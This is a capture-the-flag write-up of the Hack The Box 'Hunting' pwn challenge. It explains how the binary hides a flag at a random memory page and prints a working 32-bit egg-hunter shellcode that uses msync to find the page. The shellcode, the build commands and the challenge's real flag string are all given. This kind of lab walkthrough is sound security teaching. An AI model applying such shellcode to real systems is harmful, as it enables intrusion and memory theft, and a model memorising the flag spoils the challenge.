# Hack The Box - Hunting (pwn challenge)

## Recon

As usual, this challenge consists of a binary (`hunting`) and a netcat address/port pair.
Let's run `checksec` on the binary first to see what we're dealing with:

```Shell
$ checksec --file=hunting
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   No Symbols        No    0               3               hunting
```

No NX is interesting, that together with the challenge name seems to imply there'll be some shellcode involved (spoiler alert, there will).

Anyways, we load the binary into Ghidra in order to take a quick look at the `main` function and... the output is unreadable.
For instance, here is an excerpt from the decompiler:

```C
[...]
  *(undefined4 *)((int)puVar2 + -0xc) = 0;
  *(undefined4 *)((int)puVar2 + -0x10) = 0xffffffff;
  *(undefined4 *)((int)puVar2 + -0x14) = 0x21;
  *(undefined4 *)((int)puVar2 + -0x18) = 7;
  *(undefined4 *)((int)puVar2 + -0x1c) = 0x1000;
  *(undefined4 *)((int)puVar2 + -0x20) = 0;
  *(undefined4 *)((int)puVar2 + -0x24) = 0x11527;
  local_1c = (code *)FUN_000111a0()
[...]
```

Upon manual examination it turns out `FUN_000111a0` is actually `mmap` (hence the stack memory accesses preceding it), but Ghidra is not picking up on that for some reason.
The binary seems to load the address of the GOT into `ebx` at the beginning of `main` and then access different libc functions using these "helper" functions.

```asm
FUN_000111a0:
  ENDBR32
  JMP   dword ptr [EBX + 0x28] ; EBX points to the GOT, and there is a pointer to `mmap` at index 10 (offset 0x28)
```

Since `main` is rather small anyways we can do with just looking at the disassembly, and for that I happen to find Cutter a bit more user-friendly (plus, Cutter's disassembler seems to catch references to libc automatically).

After some reading we find that `main` is essentially doing:

```C
// returns a page-aligned random number in the range [0x60000000, 0x7f000000]                               (1)
uint32_t random = get_random();

// "hides" the flag at the beginning of a newly mapped memory page
void *map1 = mmap(random, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMUS, -1, 0);
if (map1 == -1) {
  exit(-1);
}
strcpy(map1, FLAG);
memset(FLAG, 0, 0x25); // string FLAG is 0x25 characters long
map1 = 0;
fcn.0000133d(); // SECCOMP stuff to block unintended solutions

// loads 0x3c bytes worth of shellcode and runs it
void *map2 = mmap(0, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMUS, -1, 0);
read(0, map2, 0x3c);
((code*)map2)();
```

Nice, so the program has the flag in memory, copies it over to some memory address (the exact destination being chosen at runtime), erases the both the flag and the page pointer from both the stack and data section, and lets us run whatever we want (so long as it fits in `0x3c` bytes).

## Exploitation

### `mmap` and anonymus mappings

Intuitively, we'd like to go through the whole range of addresses that may get `mmap`ed, and check if the flag is there or not (we already know that the flag will be at the first `0x25` bytes of some page in the range specified at `(1)`).
The only problem being that if we try to access some page, and it wasn't the correct one, the whole process will just crash and next time the address might be different.
So let's take a step back and take a look at the man page for `mmap` to see if we find anything interesting:

```man
[...]
   The flags argument
       The flags argument determines whether updates to the mapping are  visi‐
       ble to other processes mapping the same region, and whether updates are
       carried through to the underlying file.  This behavior is determined by
       including exactly one of the following values in flags:

       MAP_SHARED
              Share this mapping.  Updates to the mapping are visible to other
              processes  mapping  the  same  region, and (in the case of file-
              backed mappings) are carried through  to  the  underlying  file.
              (To  precisely  control  when updates are carried through to the
              underlying file requires the use of msync(2).)
[...]
```

And sure enough, the documentation tells us something interesting about `MAP_SHARED`. Namely, the fact that if specified when `mmap`ing some page, we will be able to selectively flush the memory contents to underlying file using `msync`.
Now, this binary does not map the target memory region to an actual file (though `gdb` tells us the resulting mapping corresponds to `/dev/zero (deleted)`), but maybe this does not prevent us from distinguishing between mapped and unmapped regions, regardless of what they map to.

Let's do a quick test to see if this is the case.
We can try executing the following C code:

```C
#include <string.h>
#include <stdio.h>

#include <sys/mman.h>

int main (int argc, char *argv[]) {
        void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        printf("%p\n", page);
        printf("%d\n", msync(page, 0x1000, MS_SYNC));
        printf("%d\n", msync(0x5000000000000000, 0x1000, MS_SYNC)); // Long address because I was working on a 64bit host
        return 0;
}
```

That will `msync` a `mmaped` page with no file backing, and a (hopefully) unmapped memory page, and print the results:

```Shell
$ gcc main.c; a./.out
0x73c3fd849000
0
-1
```

This tells us that no matter the backing of the page, `msync` will let us distinguish whether it's mapped or not!

### Hunting

Now for the fun part, try to come up with a snippet of assembly code that will look for the flag within the given constraints.

This should be self-explanatory, we just want to (very tightly) loop over each possible memory page and query `msync` to see if it's mapped or not:

```asm
        ; alarm(0)
        xor ebx, ebx
        mov eax, 27
        int 0x80

        ; addr = 0x5ffff000
        ; while (1) { addr += 0x1000; if (!msync(addr, 0x1000, MS_SYNC)) break; }
        mov ebx, 0x5ffff000
        mov ecx, 0x1000
        mov edx, 4

_try:
        add ebx, ecx
        mov eax, 144
        int 0x80
        cmp eax, 0
        jne _try

        ; write(1, addr, 37)
        mov ecx, ebx
        xor ebx, ebx
        inc ebx
        mov eax, edx
        mov edx, 37
        int 0x80

        ; exit(0)
        xor ebx, ebx
        xor eax, eax
        inc ax
        int 0x80
```

> Forgot to mention the host sets an `alarm` before doing anything else, and since we don't know how long the exploit will take we're better off disabling it

The shellcode looks reasonable, now let's compile it and see whether it fits inside the buffer:

```Shell
$ nasm -f elf32 shellcode.s -o shellcode.o
$ objcopy -O binary --only-section=.text shellcode.o shellcode.bin
$ wc shellcode.bin                                                        
 0  1 60 shellcode.bin
```

We used _all_ available space, and even managed to disable the `alarm` and `exit` cleanly, nice.

Let's test it locally now:

```Shell
$ ./hunting < ./shellcode.bin
HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

And we get the dummy flag, if we didn't make any erroneous assumptions it should work remotely as well:

```Shell
$ nc $HTB_HOST $HTB_PORT < ./shellcode.bin 
HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
```

And we got the flag!

